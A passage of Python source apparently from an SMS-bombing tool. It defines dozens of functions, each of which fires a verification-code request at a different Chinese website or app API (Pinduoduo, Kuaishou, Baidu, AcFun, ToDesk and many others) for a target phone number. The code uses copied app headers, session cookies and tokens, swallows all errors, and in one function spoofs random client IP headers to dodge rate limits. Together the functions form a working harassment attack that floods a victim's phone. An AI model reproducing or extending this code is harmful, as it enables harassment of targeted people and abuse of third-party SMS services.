        'Anti-Content': '0aqWfqnygjKgygd2k0fQOsewn_H_2-otWUhp0bJiZtcEBcOmdFaN_4qn5cAMJ_J__wnpNSf4s7pLtgV1ty5BVtv5VE1C5OEQGwsFEIt82_FP9I42NzGGadiWfPeRXgamirN6YVPFCwc4rT4YmfgBMJYi91NB3CP9JKnNhuFN1pWV9-yVAeV2Sj6mNPuRK7WZ5CKh0aQmi91R_BOK7nq9JL5iRT-tfL7qBQ3ndqhRxEtsqwq7jLBXS167KTec4EkZjoKeDxkZfLvLk9_kd3SETJiU6jkKfiKsEK-5DY_LY4fncgIhKGkoPcRw2oK2kpsZgpWyLhaV5LJNI4oL0TdXlg5SEf_hezS9cQKYo7Ksq7qA7mGIHeiXflxyJcdjdqMsAOuU1R8u4O0v-P--7HadH48RACBHUDZDutShmUVaIi19mgmgwr2ovH9377J3ElxE3OIlk_uMwcxUf3xisZUe5tZIjLsX8ud7rzqDAEmEEPHoPQZVukpadeiSSD8jrEpwcTbgpPYIcCcviaR3Vxjw7KlrzPfuNZV2bq2PDhAATLMHt_Z41AmbDJsao1fQz7RtWSoJ3C4sFetAT-stf1CR2dQ3J-SYgbWUnFwQumUhzgW6bFsUouALp3jW4YDmWNk8ZFQZAXet3Y1GCrJYAGC5zzY87NMvcjTAj_Wwehs1D8k9wVoY4y53P8-k',
        'Cache-Control': 'max-age=0',
        'Content-Type': 'application/json',
        'Cookie': 'api_uid=Cgp8vGouKvu6cgBxLEq6Ag==; rckk=HSnHnwrVnuKioW5pfFmhjst4oSsPU2KF; _bee=HSnHnwrVnuKioW5pfFmhjst4oSsPU2KF; ru1k=158df474-f7c7-4133-9b08-423a2f5aa822; _f77=158df474-f7c7-4133-9b08-423a2f5aa822; ru2k=a2f2f42c-10f4-4faa-8ba0-f9072fbdd6c8; _a42=a2f2f42c-10f4-4faa-8ba0-f9072fbdd6c8',
        'Etag': 'HSnHnwrVnuKioW5pfFmhjst4oSsPU2KF',
        'Origin': 'https://ims.pinduoduo.com',
        'Referer': 'https://ims.pinduoduo.com/',
        'Sec-Ch-Ua': '"Chromium";v="123", "Not:A-Brand";v="8"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 QQBrowser/21.1.8717.400'
    }
    payload = {'mobile': phone}
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_chengtakj(phone):
    url = 'https://w.chengtakj.com/api/wapp/common/sms'
    headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json; charset=UTF-8',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G9910) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36',
        'Host': 'w.chengtakj.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    }
    params = {'phone': phone, 'type': '1'}
    try:
        requests.get(url, headers=headers, params=params, timeout=10, verify=False)
    except:
        pass

def send_cjapp(phone):
    url = 'https://cjapp.cjfco.com.cn/backend/iu/sms-login/send-sms'
    headers = {
        'User-Agent': 'android14(API34 realme RMX3708)/3.0.2_307(019EACFEE2BA739E91E97A6DF2B79453)',
        'Content-Type': 'application/json; charset=UTF-8',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Host': 'cjapp.cjfco.com.cn'
    }
    payload = {'clientType': 'android', 'mobile': phone}
    try:
        requests.post(url, headers=headers, json=payload, timeout=10, verify=False)
    except:
        pass

def send_jidaiapi_289(phone):
    url = 'https://jidaiapi.tianxiangkj.cn/jidaiapi/login/phoneCode'
    headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'User-Agent': 'okhttp/3.14.9',
        'Host': 'jidaiapi.tianxiangkj.cn',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    }
    payload = {
        'androidId': '',
        'appId': '289',
        'channelId': '4',
        'googleId': '',
        'oaid': 'E10552ADFAA24BB188C827BB29CEA955abdd8566d7486bb83c891546acd7ef91',
        'phone': phone,
        'pkgName': 'weijieqian.qimiaoxiaodai.cn',
        'version': '1'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xrwangluo(phone):
    url = 'https://a.xrwangluo.com/code/code'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14; RMX3708 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36',
        'C-Token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ2aXNpdHMiOjIsImR1aWQiOiJhaWdxTXM3ais0WURBS0lFVXI2VEo2dWgiLCJkaWQiOjUzMzY0MzAxLCJhcHBpZCI6NTM3NTkwMjcsImJyYW5jaCI6ImNvbS5saWdodHBhbG0uZmVucWlhIiwidmVyc2lvbiI6IjcuOS42IiwiY2hhbm5lbCI6IjIwMDAwIiwicGlkIjoiZmVucWkiLCJwZCI6ImZlbnFpIiwiZ3JvdXAiOiJkZWZhdWx0IiwidGFncyI6W10sImxhc3QiOjYzMiwiaW5pdCI6MTc4MTAxNzEzOSwib3MiOiJhbmRyb2lkIiwicXVlcnlfb3MiOiJhbmRyb2lkIiwiYXBwX29zIjoiYW5kcm9pZCIsImFwcF92ZXJzaW9uIjoiNy45LjYiLCJxdWVyeV92ZXJzaW9uIjoiOC43LjUiLCJhcHBfaW5uZXJfdmVyc2lvbiI6IjEuMC4yIiwieHJfc2lkIjoiU1dwYWFFMXFaM2xaVkUwd1RsUmpNbGx0U1RCYWFscHRUa1JvYVUxSFVtbE5lVWs2TVhkWGVIVjFPbkpOV0RKc05rTnNWWFJpZVZRNFVGQjFXVEZ6V0hwbGNUbDBRUSJ9.alsLd816hHW8_HxX1Xwb5mT3b7pL09RYxvGmF_l2dms',
        'cookie': 'ctoken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ2aXNpdHMiOjIsImR1aWQiOiJhaWdxTXM3ais0WURBS0lFVXI2VEo2dWgiLCJkaWQiOjUzMzY0MzAxLCJhcHBpZCI6NTM3NTkwMjcsImJyYW5jaCI6ImNvbS5saWdodHBhbG0uZmVucWlhIiwidmVyc2lvbiI6IjcuOS42IiwiY2hhbm5lbCI6IjIwMDAwIiwicGlkIjoiZmVucWkiLCJwZCI6ImZlbnFpIiwiZ3JvdXAiOiJkZWZhdWx0IiwidGFncyI6W10sImxhc3QiOjYzMiwiaW5pdCI6MTc4MTAxNzEzOSwib3MiOiJhbmRyb2lkIiwicXVlcnlfb3MiOiJhbmRyb2lkIiwiYXBwX29zIjoiYW5kcm9pZCIsImFwcF92ZXJzaW9uIjoiNy45LjYiLCJxdWVyeV92ZXJzaW9uIjoiOC43LjUiLCJhcHBfaW5uZXJfdmVyc2lvbiI6IjEuMC4yIiwieHJfc2lkIjoiU1dwYWFFMXFaM2xaVkUwd1RsUmpNbGx0U1RCYWFscHRUa1JvYVUxSFVtbE5lVWs2TVhkWGVIVjFPbkpOV0RKc05rTnNWWFJpZVZRNFVGQjFXVEZ6V0hwbGNUbDBRUSJ9.alsLd816hHW8_HxX1Xwb5mT3b7pL09RYxvGmF_l2dms; Path=/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'a.xrwangluo.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    }
    data = {'number': phone, 'case': 'login'}
    try:
        requests.post(url, data=data, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_sdbao(phone):
    url = 'https://api.sdbao.com/api/account/v3/verify-code-send'
    app_time = str(int(time.time() * 1000))
    headers = {
        'api-version': '2',
        'app-time': app_time,
        'appVersion': '3.9.6',
        'AuthorizationV2': '',
        'app-id': 'android',
        'channelType': 'app_android_oppo',
        'deviceId': '19f6882bf5abd894',
        'platform': '3',
        'uniqueId': '19f6882bf5abd894',
        'user-agent': '[Wifi;RMX3708;Android;34;1240*2660*560;app_android_oppo;zh]',
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'api.sdbao.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    }
    payload = {
        'api-version': '2',
        'app-time': app_time,
        'appVersion': '3.9.6',
        'AuthorizationV2': '',
        'app-id': 'android',
        'channelType': 'app_android_oppo',
        'deviceId': '19f6882bf5abd894',
        'platform': '3',
        'uniqueId': '19f6882bf5abd894',
        'user-agent': '[Wifi;RMX3708;Android;34;1240*2660*560;app_android_oppo;zh]',
        'mobile': phone,
        'key': 'REG-CFANPBDE'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xiaoxiangyoupin(phone):
    url = 'https://api.xiaoxiangyoupin.com/v2/sms/getLoginSmsCode.json'
    data = {'mobile': phone, 'authCodeName': ''}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        requests.post(url, data=data, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_todesk(phone):
    url = 'https://wechat.todesk.com/api/phone/phonecode'
    data = {'phone': phone}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        requests.post(url, data=data, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_baidu_wallet(phone):
    url = 'https://wappass.baidu.com/wp/api/login/sms'
    data = {
        'staticpage': 'https://icash.baidu.com/static/hiloan/app/static/login/v3Jump.html',
        'charset': 'UTF-8',
        'tpl': 'fbuym',
        'apiver': 'v3',
        'tt': '1523953619675',
        'username': phone,
        'dialogVerifyCode': '',
        'vcodesign': '',
        'vcodestr': '',
        'countrycode': '',
        'ctype': '',
        'dv': 'tk0.44914422713025791523953610678@gge0lq7k3YtmzBBH76D4aItHaIsGa1NGzXsOHVAk0lp6hi76JYtmzBBH76D4aItHaIsGa1NGzXsOHVAk0d769i76DYtmzBBH76D4aItHaIsGa1NGzXsOHVAk0~tkLi760YtmzBBH76D4aItHaIsGa1NGzXsOHVAk0PtxFi76KYtmzBBH76D4aItHaIsGa1NGzXsOHVAk0'
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        requests.post(url, data=data, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_jiliguala(phone):
    url = 'https://ggr.jiliguala.com/api/user/sms'
    params = {'mobile': phone, 'nonce': '1B3B0C71B5E74FBF8187A31EB4D08752'}
    try:
        requests.get(url, params=params, timeout=10, verify=False)
    except:
        pass

def send_kuaishou(phone):
    url = 'https://id.kuaishou.com/pass/kuaishou/sms/requestMobileCode'
    data = {'sid': 'kuaishou.recharge.web', 'phone': phone, 'type': '53', 'countryCode': '+86'}
    try:
        requests.post(url, data=data, timeout=15, verify=False)
    except:
        pass

def send_bjgas(phone):
    url = 'http://zt.bjgas.com/bjgas-server/c/api/getVerificationCode'
    payload = {'mobile': phone, 'type': 'register'}
    headers = {'Content-Type': 'application/json'}
    try:
        requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_acfun(phone):
    url = 'https://id.app.acfun.cn/rest/web/sms/send'
    data = {'type': '39', 'countryCode': '+86', 'phone': phone}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        requests.post(url, data=data, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_shanxindafy(phone):
    url = 'https://api.shanxindafy.com/app-api/client/auth/send-sms-code'
    payload = {'mobile': phone, 'scene': 1}
    def random_ip():
        return '.'.join([str(random.randint(0, 255)) for _ in range(4)])
    headers = {
        'User-Agent': 'okhttp/4.9.3',
        'Accept-Encoding': 'gzip',
        'di': 'eyJvYWlkIjoiRjFCNEUzRjk4MjVBNEE0REI0NjhFQkYxQ0EwRkQ2QzM4ZDE2N2FmZmQ2M2MzMmFiZmE1ODc2NmNiNTAxNzE1NyIsIlVNSUQiOiI2YzhjNmM5MzQwOTE3MWY2OWU3NjgxYjhlOTJlN2VhYm9kIiwiYW5kcm9pZE5hbWUiOiJPbmVQbHVzIn0=',
        'an': '5rW36YeP5oub5YW86IGM',
        'cl': 'T1BQTw==',
        'cyn': '5YWo5Zu9',
        'pn': 'Y29tLmhsemp6LndlYWdhd2Vn',
        'vs': 'MS4wLjI=',
        'content-type': 'application/json; charset=utf-8',
        'X-Forwarded-For': random_ip(),
        'X-Real-IP': random_ip()
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_caihangzg(phone):
    url = 'https://caihangzg.cn/Mini/User/VerCode'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_ylzhaopin(phone):
    url = 'https://m.ylzhaopin.com/Wxapi/Account/getverify'
    data = {'tel': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ5cHdhcHAiLCJuYW1lIjoiRjFCNEUzRjk4MjVBNEE0REI0NjhFQkYxQ0EwRkQ2QzM4ZDE2N2FmZmQ2M2MzMmFiZmE1ODc2NmNiNTAxNzE1NyIsImlhdCI6MTc4MDk3MjU5MCwiZXhwIjoxNzgwOTc5NzkwfQ.TZEai8SNo84fSux8xPQfdgK528KKDCi-8t5dCfFdg3g',
        'Cookie': 'PHPSESSID=7a80vl0jmid9t9jslft3cd3ff6'
    }
    try:
        requests.post(url, data=data, headers=headers, timeout=15, verify=False)
    except:
        pass

def send_job2050(phone):
    url = 'https://www.job2050.com/wap/index.php?c=apicloud&a=sendmsgbyreg'
    data = {'phone': phone}
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36', 'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        requests.post(url, data=data, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_tailgdd(phone):
    url = f'https://www.tailgdd.com/v1/api/app/getCode?phone={phone}'
    headers = {
        'Authorization': '',
        'Forward-Service-Ip': 'localhost',
        'language': 'zh_CN',
        'Host': 'www.tailgdd.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.2.2'
    }
    try:
        requests.post(url, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xcontrol(phone):
    url = 'https://xcontrol.com.cn/user/api/v1/sendCode'
    payload = {'number': phone, 'lcid': 2052, 'type': 0}
    headers = {
        'User-Agent': 'okhttp/4.9.2',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json;charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_hzbzh(phone):
    url = 'https://www.hzbzh.com/prod-api/auth/app/sms/code'
    data = {'mobile': phone, 'scene': 'login'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    }
    try:
        requests.post(url, data=data, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_meowhub(phone):
    url = 'https://test.app.meowhub.cn/api/app/auth/sms/send'
    payload = {'mobile': phone, 'scene': 'login'}
    headers = {
        'User-Agent': 'Dart/3.11 (dart:io)',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'clientid': 'hycollect_app'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_mysmp(phone):
    url = 'https://www.mysmp.cn/xhaiapi/apiservice/auth/sendAuthCode'
    payload = {'mobile': phone, 'type': '1'}
    headers = {
        'User-Agent': 'okhttp-okgo/jeasonlzy',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'apiInfo': '{"appId":"1","brand":"luoyue","buildVersion":"1","channel":"4","model":"PJE110","osInfo":"","phone":"","plat":"android","platformCode":"android","version":"1.0.0","userId":0}',
        'Authorization': ''
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_rcpass(phone):
    url = 'https://rcpass.com/api/user/sendValidateCode'
    params = {'nationCode': '86', 'cellphone': phone, 'type': 'login'}
    headers = {
        'User-Agent': 'Dart/3.4 (dart:io)',
        'Accept-Encoding': 'gzip',
        'content-type': 'application/json',
        'access-control-allow-origin': '*'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_esjieke(phone):
    url = 'https://admin.esjiekeiot.com/api/wanlshop/sms/send'
    params = {'event': 'mobilelogin', 'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'App-version': '3.0.2',
        'App-client': 'Android',
        'App-imei': '',
        'device-type': 'OnePlus',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Type': 'application/json;charset=UTF-8'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_jielema(phone):
    url = 'https://habit-api.jielema.cc/auth/request-code'
    payload = {'phone': phone}
    headers = {'User-Agent': 'Dart/3.11 (dart:io)', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json'}
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_fanshu1(phone):
    url = 'https://fanshu1.com/api/sms/send'
    payload = {'event': 'login', 'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json;charset=UTF-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_fengchaojianzhi(phone):
    url = 'https://app-api.fengchaojianzhi.com/user/auth/sms/send'
    payload = {'phone': phone, 'type': 'login', 'channel': 'android'}
    headers = {
        'User-Agent': 'com.lgb.jqjc/1.4.3 (Android 36; PJE110_16.0.3.500(CN01); build:27) oem/OnePlus model/PJE110 screen/1080*2376/3.0',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'x-dev-brand': 'oneplus',
        'x-os-version': '16',
        'x-os-type': 'android',
        'x-oaid': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157',
        'x-dev-name': 'OnePlus PJE110',
        'x-app-platform': '98',
        'x-timezone': '+08:00',
        'x-pkg-sc': 'oppo',
        'x-android-id': 'b8ba6e49559d2379',
        'x-channel': 'oppo',
        'x-device-id': '114695049b2dbc067822c251105876b5',
        'x-dev-network': 'wifi',
        'x-trace-id': '3daf913c-3d88-4858-b710-ada3d5d41c24',
        'x-app-version': '1.4.3',
        'x-dev-model': 'PJE110',
        'x-language': 'zh_CN',
        'x-platform': 'app'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_gdcaiyanshe(phone):
    url = 'https://api.gdcaiyanshe.cn/api/v2/users/send-phone-code'
    payload = {'type': 'register', 'phone': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_agrivoice(phone):
    url = 'https://agrivoice.gcjxboss.com/api/v1/auth/send-sms'
    payload = {'scene': 'login', 'phone': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_jiuxiaotou(phone):
    url = 'https://jxt.jiuxiaotou.com/api/auth/send-code'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_zl6lz(phone):
    url = 'http://app.zl6lz.com//appapi/'
    params = {
        'service': 'Login.getCode',
        'version': '1.0.4',
        'model': 'PJE110',
        'system': '16',
        'imei': '5c2dc226e49dbe35',
        'mobile': phone,
        'sign': 'a3303c96490afe096369b9b4161d382d',
        'country_code': '86'
    }
    headers = {
        'User-Agent': 'okhttp-okgo/jeasonlzy',
        'Accept-Encoding': 'gzip',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'X-Signature': '7f4dc1c10eb0a7b63be13f1fd737f53a6da191c21b2c4dae1473280a044416b7',
        'timestamp': '1781109691',
        'X-Nonce': 'f3cebb48-759c-492b-834d-11ba6e179f72-8152626',
        'X-App-Id': 'lrc_app_2026_001',
        'X-YD-Req-Token': '1781109991|LmjxgY8R2zoV|dbaa4f92ce17e5586052cb89d0b5a5a4',
        'Cookie': 'PHPSESSID=1d0g307tfrtf91609unh52a9ku'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_swee9(phone):
    url = 'https://app.swee9.icu//api/passport/send_code'
    payload = {'type': 'login', 'mobile': phone}
    headers = {
        'User-Agent': 'okhttp/4.9.1',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'source-id': '1',
        'ver-code': '2011',
        'token': '',
        'phone-brand': 'PJE110',
        'version': '2.0.11',
        'channel': '4',
        'package-name': 'com.icu.swee.nianhe',
        'uuid': '832de281ab438d71',
        'network-status': 'wifi',
        'theme': 'vqu-white',
        'oaid': '',
        'timestamp': '1781109153480',
        'random': '16845',
        'sign': 'a1da6f9ab0dd7dfbf2e70c814f5f9f70'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_cremomo(phone):
    url = 'https://ai-entity.cremomo.cn/user/send_code'
    encoded_phone = base64.b64encode(phone.encode()).decode()
    params = {'platform': 'android', 'os_version': '16', 'mode': 'PJE110', 'firm': 'OnePlus', 'channel': '413415', 'version_code': '1.0.0.1'}
    payload = {'itu_code': '+86', 'phone': encoded_phone, 'product_name': 'CreMoMo'}
    headers = {
        'User-Agent': 'okhttp/4.8.0',
        'Content-Type': 'application/json; charset=UTF-8',
        'timezone-name': 'Asia/Shanghai',
        'timezone': '480',
        'accept-language': 'zh-CN'
    }
    try:
        requests.post(url, params=params, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_huidoutx(phone):
    url = 'https://tx.huidoutx.com/shop-mall/common/sms/send'
    params = {'mobileNo': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'AuthorizationType': '2',
        'Content-Type': 'application/json;charset=UTF-8'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_chinese(phone):
    url = 'http://app-bridge.chinese.cn/chineseplus-api/bridge/api/v1/send-sms-code'
    payload = {'mobile': phone, 'region_code': 'CN', 'code_type': 'register'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Authorization': '',
        'app-token': ''
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_qianbi(phone):
    url = 'https://api-prod.qianbi.cool/app/auth/sendSmsCode'
    payload = {'phoneNumber': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_kuochat(phone):
    url = 'https://api.kuochat.cn/api/users/verification-code'
    payload = {'phoneNumber': phone}
    headers = {
        'User-Agent': 'Dart/3.11 (dart:io)',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'x-device-info': '{"deviceName":"","os":"","appVersion":"1.1.2+1"}'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_mshen(phone):
    url = 'http://cyr.mshen.xin/Andr/get_Code'
    payload = {'tel': phone}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xiaosu(phone):
    url = 'https://www.xiaosu-travel.cn/app-api/member/auth/send-sms-code'
    payload = {'mobile': phone, 'scene': '1', 'tenant_id': '1'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'authorization': 'Bearer',
        'tenant_id': '1',
        'terminal': '31'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_fuliaoxx(phone):
    url = 'https://shuang.fuliaoxx.com/api/sms/send'
    payload = {'mobile': phone, 'event': 'mobilelogin'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'isToken': 'false'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_ziyue(phone):
    url = 'https://ziyue.中国/index/sendcode'
    payload = {'uszh': phone}
    headers = {
        'Host': 'ziyue.xn--fiqs8s',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Cookie': 'PHPSESSID=68d3fd11828f720fbfff7eb20b14e6f4'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_botstreet(phone):
    url = 'https://botstreet.io/api/v1/auth/send-code'
    payload = {'phone': phone, 'scene': 'sms-login'}
